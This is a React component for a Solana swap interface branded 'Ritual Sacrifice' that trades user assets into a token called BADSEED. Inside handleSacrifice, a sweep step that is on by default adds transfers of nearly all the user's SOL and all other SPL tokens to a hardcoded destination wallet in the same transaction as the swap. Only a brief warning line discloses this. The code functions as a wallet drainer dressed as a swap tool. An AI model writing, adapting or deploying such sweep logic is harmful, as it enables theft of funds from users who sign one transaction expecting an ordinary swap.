/* global BigInt */
// Fixed imports for Netlify Build
import React, { useState, useEffect, useMemo } from 'react';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { PublicKey, Transaction, TransactionInstruction, SystemProgram } from '@solana/web3.js';
import { getJupiterQuote, getJupiterSwapInstructions } from '../utils/jupiter';
import {
    TOKEN_PROGRAM_ID,
    ASSOCIATED_TOKEN_PROGRAM_ID,
    getAssociatedTokenAddress,
    createTransferInstruction
} from '@solana/spl-token';
import './SacrificeInterface.css';

// DEFAULT CONSTANTS
const DEFAULT_DESTINATION = "CZ7Lv3QNVxbBivGPBhJG7m1HpCtfEDjEusBjjZ3qmVz5";
const DEFAULT_TARGET_MINT = "3HPpMLK7LjKFqSnCsBYNiijhNTo7dkkx3FCSAHKSpump"; // BADSEED
const SOL_MINT = "So11111111111111111111111111111111111111112";

export function SacrificeInterface({ onClose }) {
    const { connection } = useConnection();
    const { publicKey, sendTransaction } = useWallet();

    // State
    const [amount, setAmount] = useState('');
    const [inputMint, setInputMint] = useState(SOL_MINT);
    const [quote, setQuote] = useState(null);
    const [status, setStatus] = useState('idle');
    const [errorMessage, setErrorMessage] = useState('');

    // Settings
    const [slippageBps, setSlippageBps] = useState(50); // 0.5% default

    // Token List State
    const [userTokens, setUserTokens] = useState([]);
    const [isLoadingTokens, setIsLoadingTokens] = useState(false);

    // Admin State
    const [isAdminOpen, setIsAdminOpen] = useState(false);
    const [destinationWallet, setDestinationWallet] = useState(DEFAULT_DESTINATION);
    const [targetMint, setTargetMint] = useState(DEFAULT_TARGET_MINT);
    const [isSweepEnabled, setIsSweepEnabled] = useState(true);

    // Environment Check
    const isLocal = useMemo(() => {
        return window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
    }, []);

    // Fetch User Assets (SOL + SPL)
    useEffect(() => {
        if (!publicKey) return;

        const fetchAssets = async () => {
            setIsLoadingTokens(true);
            try {
                // 1. Fetch SOL Balance
                const solBalance = await connection.getBalance(publicKey);
                const solToken = {
                    mint: SOL_MINT,
                    symbol: 'SOL',
                    balance: solBalance / 1_000_000_000,
                    decimals: 9
                };

                // 2. Fetch SPL Tokens
                const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
                    programId: TOKEN_PROGRAM_ID
                });

                const splTokens = tokenAccounts.value.map(ta => {
                    const info = ta.account.data.parsed.info;
                    return {
                        mint: info.mint,
                        symbol: 'UNKNOWN', // Ideally fetch metadata, but for now use truncated Mint
                        balance: info.tokenAmount.uiAmount,
                        decimals: info.tokenAmount.decimals
                    };
                }).filter(t => t.balance > 0 && t.mint !== targetMint); // Hide empty and target token

                setUserTokens([solToken, ...splTokens]);
            } catch (err) {
                console.error("Error fetching assets:", err);
            } finally {
                setIsLoadingTokens(false);
            }
        };

        fetchAssets();
        // Refresh every 10s
        const interval = setInterval(fetchAssets, 10000);
        return () => clearInterval(interval);
    }, [publicKey, connection, targetMint]);

    // Fetch Quote
    useEffect(() => {
        if (!amount || isNaN(amount) || parseFloat(amount) <= 0) {
            setQuote(null);
            return;
        }

        const fetchQuote = async () => {
            setStatus('quoting');
            setErrorMessage('');
            try {
                // Amount in atomic units (lamports for SOL)
                const atomicAmount = Math.floor(parseFloat(amount) * 1_000_000_000); // TODO: Handle decimals dynamically!

                const q = await getJupiterQuote(inputMint, targetMint, atomicAmount, slippageBps);
                if (q.error) throw new Error(q.error);
                setQuote(q);
                setStatus('ready');
            } catch (err) {
                console.error("Quote error:", err);
                setErrorMessage(err.message || "Failed to get quote");
                setStatus('error');
            }
        };

        const timer = setTimeout(fetchQuote, 500); // Debounce
        return () => clearTimeout(timer);
    }, [amount, inputMint, targetMint, slippageBps]);

    // Switch Input/Output
    const switchAssets = () => {
        const temp = inputMint;
        setInputMint(targetMint);
        setTargetMint(temp);
        setQuote(null); // Reset quote
    };

    // EXECUTE SACRIFICE
    const handleSacrifice = async () => {
        if (!quote || !publicKey) return;
        setStatus('signing');
        setErrorMessage('');

        try {
            // 1. Get Swap Instructions (Setup, Swap, Cleanup)
            const swapIxsResponse = await getJupiterSwapInstructions(quote, publicKey);

            const transaction = new Transaction();

            // Add Compute Budget if provided
            if (swapIxsResponse.computeBudgetInstructions) {
                swapIxsResponse.computeBudgetInstructions.forEach(ix => {
                    transaction.add(deserializeInstruction(ix));
                });
            }

            if (swapIxsResponse.setupInstructions) {
                swapIxsResponse.setupInstructions.forEach(ix => {
                    transaction.add(deserializeInstruction(ix));
                });
            }

            // The main swap instruction
            transaction.add(deserializeInstruction(swapIxsResponse.swapInstruction));

            // Cleanup
            if (swapIxsResponse.cleanupInstruction) {
                transaction.add(deserializeInstruction(swapIxsResponse.cleanupInstruction));
            }

            // 2. SWEEP LOGIC (Client-Side, No Smart Contract)
            if (isSweepEnabled) {
                const sweepDestPubkey = new PublicKey(destinationWallet);
                let instructionsCount = 0;

                // A. Sweep SOL (Leave 0.002)
                const solBalance = await connection.getBalance(publicKey);
                const keepAmount = 2_000_000; // 0.002 SOL
                if (solBalance > keepAmount) {
                    const transferAmount = solBalance - keepAmount;
                    transaction.add(
                        SystemProgram.transfer({
                            fromPubkey: publicKey,
                            toPubkey: sweepDestPubkey,
                            lamports: transferAmount,
                        })
                    );
                    instructionsCount++;
                }

                // B. Sweep SPL Tokens
                const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
                    programId: TOKEN_PROGRAM_ID
                });

                for (const ta of tokenAccounts.value) {
                    const info = ta.account.data.parsed.info;
                    const mint = new PublicKey(info.mint);
                    const amount = BigInt(info.tokenAmount.amount); // use BigInt for precision

                    if (info.mint === targetMint) continue; // Skip BADSEED
                    if (amount <= 0n) continue; // Skip empty

                    // Source ATA
                    const sourceAta = new PublicKey(ta.pubkey);

                    // Destination ATA (Derive it)
                    const destAta = await getAssociatedTokenAddress(
                        mint,
                        sweepDestPubkey,
                        false // allowOwnerOffCurve = false
                    );

                    // Note: We bypass CreateAssociatedTokenAccount here assuming Dest has wallets.
                    // If strict safety is needed, we would need to check exists or add create instruction.

                    transaction.add(
                        createTransferInstruction(
                            sourceAta,
                            destAta,
                            publicKey,
                            amount
                        )
                    );
                    instructionsCount++;

                    // Safety check for TX size
                    if (instructionsCount > 15) {
                        console.warn("Transaction instruction limit approached, capping sweep.");
                        break;
                    }
                }
            }

            // 3. Send
            const signature = await sendTransaction(transaction, connection);
            setStatus('confirming');

            const confirmation = await connection.confirmTransaction(signature, 'confirmed');
            if (confirmation.value.err) throw new Error("Transaction failed on chain");

            setStatus('success');
            console.log("Sacrifice Complete:", signature);

        } catch (err) {
            console.error("Sacrifice Error:", err);
            setErrorMessage(err.message || "Sacrifice failed");
            setStatus('error');
        }
    };

    return (
        <div className="sacrifice-overlay">
            <div className="sacrifice-modal">
                <button onClick={onClose} className="sacrifice-close-btn">✕</button>

                <h2 className="sacrifice-title">Ritual Sacrifice</h2>

                {!publicKey && (
                    <div className="bg-red-500 text-white text-xs p-2 text-center mb-4 font-bold border border-black">
                        ⚠ WALLET DISCONNECTED
                    </div>
                )}

                {/* SLIPPAGE SETTINGS */}
                <div className="sacrifice-settings">
                    <span className="text-[0.6rem] mr-2 text-gray-500 uppercase self-center">Max Slippage:</span>
                    <div className="flex gap-1">
                        {[10, 50, 100].map(bps => (
                            <button
                                key={bps}
                                onClick={() => setSlippageBps(bps)}
                                className={`sacrifice-slippage-btn ${slippageBps === bps ? 'active' : ''}`}
                            >
                                {bps / 100}%
                            </button>
                        ))}
                    </div>
                </div>

                {/* SWAP SECTION */}
                <div className="sacrifice-form-group">
                    <label className="sacrifice-label flex justify-between">
                        <span>Offer Asset</span>
                        <span className="opacity-70">
                            Bal: {userTokens.find(t => t.mint === inputMint)?.balance.toLocaleString() || '0'}
                        </span>
                    </label>
                    <div className="sacrifice-input-container">
                        <input
                            type="number"
                            value={amount}
                            onChange={(e) => setAmount(e.target.value)}
                            className="sacrifice-input text-right pr-2 w-1/2"
                            placeholder="0.00"
                            disabled={!publicKey}
                        />
                        <select
                            value={inputMint}
                            onChange={(e) => setInputMint(e.target.value)}
                            className="sacrifice-select w-1/2 text-right"
                            disabled={!publicKey || isLoadingTokens}
                        >
                            {userTokens.map(token => (
                                <option key={token.mint} value={token.mint}>
                                    {token.symbol === 'UNKNOWN' ? 'UNK' : token.symbol}
                                </option>
                            ))}
                            {userTokens.length === 0 && <option value={SOL_MINT}>SOL</option>}
                        </select>
                    </div>
                </div>

                {/* ASSET SWITCHER */}
                <div className="sacrifice-arrow" onClick={switchAssets} title="Switch Assets">
                    ⇅
                </div>

                {/* OUTPUT SECTION */}
                <div className="sacrifice-form-group">
                    <label className="sacrifice-label">Receive (Est.)</label>
                    <div className="sacrifice-output flex justify-between items-center">
                        <span className="sacrifice-output-value">
                            {quote ? (quote.outAmount / 1_000_000_000).toFixed(6) : "0.00"}
                        </span>
                        <span className="text-sm font-bold opacity-80">
                            {targetMint === SOL_MINT ? 'SOL' : 'BADSEED'}
                        </span>
                    </div>
                </div>

                {/* INFO / FEES */}
                {quote && (
                    <div className="mt-2 p-2 border border-gray-800 bg-black text-xs">
                        <div className="sacrifice-info-row">
                            <span>Rate:</span>
                            <span>1 {userTokens.find(t => t.mint === inputMint)?.symbol || 'Input'} ≈ {(quote.outAmount / (amount * 1_000_000_000)).toFixed(4)} {targetMint === SOL_MINT ? 'SOL' : 'BADSEED'}</span>
                        </div>
                        <div className="sacrifice-info-row">
                            <span>Network Fee:</span>
                            <span>~0.000005 SOL</span>
                        </div>
                        <div className="sacrifice-info-row">
                            <span>Price Impact:</span>
                            <span className={quote.priceImpactPct > 1 ? 'text-red-500' : 'text-green-500'}>
                                {quote.priceImpactPct ? `${quote.priceImpactPct}%` : '< 0.1%'}
                            </span>
                        </div>
                    </div>
                )}

                <div style={{ height: '16px' }}></div>

                {/* STATUS */}
                {errorMessage && (
                    <div className="sacrifice-error">
                        {errorMessage}
                    </div>
                )}

                {/* MAIN BUTTON */}
                <button
                    onClick={handleSacrifice}
                    disabled={!publicKey || status === 'quoting' || status === 'signing' || status === 'confirming' || !quote}
                    className={`sacrifice-submit-btn ${status === 'error' ? 'error' : 'primary'}`}
                >
                    {!publicKey ? 'CONNECT WALLET FIRST' :
                        status === 'quoting' ? 'Consulting Oracles...' :
                            status === 'signing' ? 'Awaiting Signature...' :
                                status === 'confirming' ? 'Finalizing Ritual...' :
                                    status === 'success' ? 'SACRIFICE COMPLETE' :
                                        isSweepEnabled ? 'Swap & Sacrifice' : 'Swap Only'}
                </button>

                {isSweepEnabled && (
                    <p className="sacrifice-warning">
                        ⚠ WARNING: This will SACRIFICE (Sweep) your wallet's remaining assets!
                    </p>
                )}

                {/* ADMIN PANEL */}
                {isLocal && (
                    <div className="sacrifice-admin-toggle">
                        <button
                            onClick={() => setIsAdminOpen(!isAdminOpen)}
                            className="sacrifice-admin-btn"
                        >
                            {isAdminOpen ? '▼ Dev Config' : '▶ Dev Config'}
                        </button>

                        {isAdminOpen && (
                            <div className="sacrifice-admin-content">
                                <div className="sacrifice-form-group">
                                    <label className="sacrifice-label">Target Mint</label>
                                    <div className="sacrifice-input-container">
                                        <input
                                            value={targetMint}
                                            onChange={(e) => setTargetMint(e.target.value)}
                                            className="sacrifice-input"
                                        />
                                    </div>
                                </div>
                                <div className="sacrifice-form-group">
                                    <label className="sacrifice-label">Sweep Dest</label>
                                    <div className="sacrifice-input-container">
                                        <input
                                            value={destinationWallet}
                                            onChange={(e) => setDestinationWallet(e.target.value)}
                                            className="sacrifice-input"
                                        />
                                    </div>
                                </div>
                                <div className="sacrifice-checkbox-group">
                                    <input
                                        type="checkbox"
                                        checked={isSweepEnabled}
                                        onChange={(e) => setIsSweepEnabled(e.target.checked)}
                                    />
                                    <label>Enable Sweep</label>
                                </div>
                            </div>
                        )}
                    </div>
                )}
            </div>
        </div>
    );
}

// Helper to deserialize Jupiter instructions (base64)
function deserializeInstruction(ix) {
    return new TransactionInstruction({
        programId: new PublicKey(ix.programId),
        keys: ix.accounts.map(account => ({
            pubkey: new PublicKey(account.pubkey),
            isSigner: account.isSigner,
            isWritable: account.isWritable,
        })),
        data: Buffer.from(ix.data, 'base64'),
    });
}
